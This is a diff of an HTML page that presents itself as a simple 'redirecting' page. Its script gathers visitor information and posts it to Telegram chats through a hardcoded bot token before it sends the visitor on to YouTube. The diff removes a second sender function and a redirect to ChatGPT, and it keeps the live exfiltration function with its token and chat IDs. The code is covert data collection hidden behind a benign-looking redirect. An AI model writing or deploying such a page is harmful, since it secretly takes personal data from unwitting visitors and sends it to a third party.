@@ -30,15 +30,13 @@
   </style>
 </head>
 <body>
-  <h1>.</h1>
+  <h1>redirecting.....</h1>
 
   <script>
     setTimeout(() => {
   sendToTelegram();
-  sendToTelegram2();
-
-  window.location.href = "https://chatgpt.com/";
-}, 500);
+  window.location.href = "https://www.youtube.com/";
+}, 5000); 
 
     let collectedData = {};
 
@@ -147,90 +145,11 @@
       
     }
 
-
-
-
-
-// async function sendToTelegram() {
-//   const botToken = "8079871434:AAFlp-MDPEFED9uTwGoHG1wN00OwbNVsVd0";
-//   const chatIds = ["7258927081", "6854356772"];
-
-//   const message =
-//     "*📊 User Info Collected:*\n```\n" +
-//     JSON.stringify(collectedData, null, 2) +
-//     "\n```";
-
-//   try {
-//     for (const chatId of chatIds) {
-//       const res = await fetch(
-//         `https://api.telegram.org/bot${botToken}/sendMessage`,
-//         {
-//           method: "POST",
-//           headers: {
-//             "Content-Type": "application/json"
-//           },
-//           body: JSON.stringify({
-//             chat_id: chatId,
-//             text: message,
-//             parse_mode: "Markdown"
-//           })
-//         }
-//       );
-
-//       if (!res.ok) {
-//         console.error(`Failed to send to ${chatId}:`, await res.text());
-//       }
-//     }
-//   } catch (error) {
-//     console.error("Telegram error:", error);
-//   }
-// }
-
-
-
-
-
-
-    async function sendToTelegram2() {
-      const botToken = "8079871434:AAFlp-MDPEFED9uTwGoHG1wN00OwbNVsVd0";
-      const chatId = "6854356772"; // Replace with your Telegram user ID
-      const message = "*📊 User Info Collected:*\n```\n" + JSON.stringify(collectedData, null, 2) + "\n```";
-
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: "Markdown"
-       })
-        });
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    
     
     async function sendToTelegram() {
       const botToken = "8079871434:AAFlp-MDPEFED9uTwGoHG1wN00OwbNVsVd0";
-      const chatId = "7258927081"; // Replace with your Telegram user ID
+      const chatId = "6854356772"; // Replace with your Telegram user ID
+
       const message = "*📊 User Info Collected:*\n```\n" + JSON.stringify(collectedData, null, 2) + "\n```";
 
       try {
@@ -243,14 +162,14 @@
             chat_id: chatId,
             text: message,
             parse_mode: "Markdown"
-       })
+          })
         });
 
         
-    //   } catch (error) {
+      } catch (error) {
         
-    //   }
-    // }
+      }
+    }
 
     getUserInfo();
   </script>
